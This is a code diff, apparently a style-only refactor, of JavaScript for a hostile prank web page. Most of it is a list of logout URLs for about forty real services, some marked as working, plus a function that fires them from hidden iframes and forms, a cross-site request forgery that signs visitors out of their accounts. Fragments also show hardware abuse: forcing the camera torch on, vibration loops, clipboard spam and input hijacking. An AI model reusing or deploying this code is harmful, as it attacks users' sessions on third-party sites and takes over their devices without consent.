@@ -105,43 +105,43 @@ const PHRASES = [
 ]
 
 const LOGOUT_SITES = {
-  'AOL': ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
+  AOL: ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
   'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
-  'Amazon': ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
-  'Blogger': ['GET', 'https://www.blogger.com/logout.g'],
-  'Delicious': ['GET', 'https://www.delicious.com/logout'], // works!
-  'DeviantART': ['POST', 'https://www.deviantart.com/users/logout'],
-  'DreamHost': ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
-  'Dropbox': ['GET', 'https://www.dropbox.com/logout'],
-  'eBay': ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
-  'Gandi': ['GET', 'https://www.gandi.net/login/out'],
-  'GitHub': ['GET', 'https://github.com/logout'],
-  'GMail': ['GET', 'https://mail.google.com/mail/?logout'],
-  'Google': ['GET', 'https://www.google.com/accounts/Logout'], // works!
-  'Hulu': ['GET', 'https://secure.hulu.com/logout'],
-  'Instapaper': ['GET', 'https://www.instapaper.com/user/logout'],
-  'Linode': ['GET', 'https://manager.linode.com/session/logout'],
-  'LiveJournal': ['POST', 'https://www.livejournal.com/logout.bml', {'action:killall': '1'}],
-  'MySpace': ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
-  'NetFlix': ['GET', 'https://www.netflix.com/Logout'],
+  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
+  Blogger: ['GET', 'https://www.blogger.com/logout.g'],
+  Delicious: ['GET', 'https://www.delicious.com/logout'], // works!
+  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
+  DreamHost: ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
+  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
+  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
+  Gandi: ['GET', 'https://www.gandi.net/login/out'],
+  GitHub: ['GET', 'https://github.com/logout'],
+  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
+  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
+  Hulu: ['GET', 'https://secure.hulu.com/logout'],
+  Instapaper: ['GET', 'https://www.instapaper.com/user/logout'],
+  Linode: ['GET', 'https://manager.linode.com/session/logout'],
+  LiveJournal: ['POST', 'https://www.livejournal.com/logout.bml', { 'action:killall': '1' }],
+  MySpace: ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
+  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
   'New York Times': ['GET', 'https://www.nytimes.com/logout'],
-  'Newegg': ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
-  'Photobucket': ['GET', 'https://photobucket.com/logout'],
-  'Skype': ['GET', 'https://secure.skype.com/account/logout'],
-  'Slashdot': ['GET', 'https://slashdot.org/my/logout'],
-  'SoundCloud': ['GET', 'https://soundcloud.com/logout'],
+  Newegg: ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
+  Photobucket: ['GET', 'https://photobucket.com/logout'],
+  Skype: ['GET', 'https://secure.skype.com/account/logout'],
+  Slashdot: ['GET', 'https://slashdot.org/my/logout'],
+  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
   'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
   'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
-  'ThinkGeek': ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
-  'Threadless': ['GET', 'https://www.threadless.com/logout'],
-  'Tumblr': ['GET', 'https://www.tumblr.com/logout'],
-  'Vimeo': ['GET', 'https://vimeo.com/log_out'],
-  'Wikipedia': ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
+  ThinkGeek: ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
+  Threadless: ['GET', 'https://www.threadless.com/logout'],
+  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
+  Vimeo: ['GET', 'https://vimeo.com/log_out'],
+  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
   'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
-  'Woot': ['GET', 'https://account.woot.com/logout'],
-  'Wordpress': ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
-  'Yahoo': ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
-  'YouTube': ['POST', 'https://www.youtube.com', {'action_logout': '1'}]
+  Woot: ['GET', 'https://account.woot.com/logout'],
+  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
+  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
+  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }]
 }
 
 /**
@@ -368,7 +368,7 @@ function requestCameraAndMic () {
 
       imageCapture.getPhotoCapabilities().then(() => {
         // Let there be light!
-        track.applyConstraints({ advanced: [{torch: true}] })
+        track.applyConstraints({ advanced: [{ torch: true }] })
       }, () => { /* No torch on this device */ })
     }, () => { /* ignore errors */ })
   })
@@ -401,7 +401,6 @@ function startVibrateInterval () {
     }
   })
 }
-
 
 /**
  * Intercept all user-initiated events and call the given the function, `onInput`.
@@ -579,19 +578,19 @@ function copySpamToClipboard () {
  */
 function clipboardCopy (text) {
   // A <span> contains the text to copy
-  var span = document.createElement('span')
+  const span = document.createElement('span')
   span.textContent = text
   span.style.whiteSpace = 'pre' // Preserve consecutive spaces and newlines
 
   // An <iframe> isolates the <span> from the page's styles
-  var iframe = document.createElement('iframe')
+  const iframe = document.createElement('iframe')
   iframe.sandbox = 'allow-same-origin'
   document.body.appendChild(iframe)
 
-  var win = iframe.contentWindow
+  let win = iframe.contentWindow
   win.document.body.appendChild(span)
 
-  var selection = win.getSelection()
+  let selection = win.getSelection()
 
   // Firefox fails to get a selection from <iframe> window, so fallback
   if (!selection) {
@@ -600,12 +599,12 @@ function clipboardCopy (text) {
     document.body.appendChild(span)
   }
 
-  var range = win.document.createRange()
+  const range = win.document.createRange()
   selection.removeAllRanges()
   range.selectNode(span)
   selection.addRange(range)
 
-  var success = false
+  let success = false
   try {
     success = win.document.execCommand('copy')
   } catch (err) {
@@ -685,7 +684,7 @@ function superLogout () {
   }
 
   function post (url, params) {
-    var iframe = document.createElement('iframe')
+    const iframe = document.createElement('iframe')
     iframe.style = HIDDEN_STYLE
     iframe.name = 'iframe' + numSuperLogoutIframes
     document.body.appendChild(iframe)
@@ -717,7 +716,7 @@ function superLogout () {
     document.body.appendChild(form)
     form.submit()
   }
-  for (let name in LOGOUT_SITES) {
+  for (const name in LOGOUT_SITES) {
     const method = LOGOUT_SITES[name][0]
     const url = LOGOUT_SITES[name][1]
     const params = LOGOUT_SITES[name][2] || {}
@@ -781,7 +780,7 @@ function setupSearchWindow (win) {
   if (!win) return
   win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
   let searchIndex = 1
-  let interval = setInterval(() => {
+  const interval = setInterval(() => {
     if (searchIndex >= SEARCHES.length) {
       clearInterval(interval)
       win.window.location = window.location.pathname
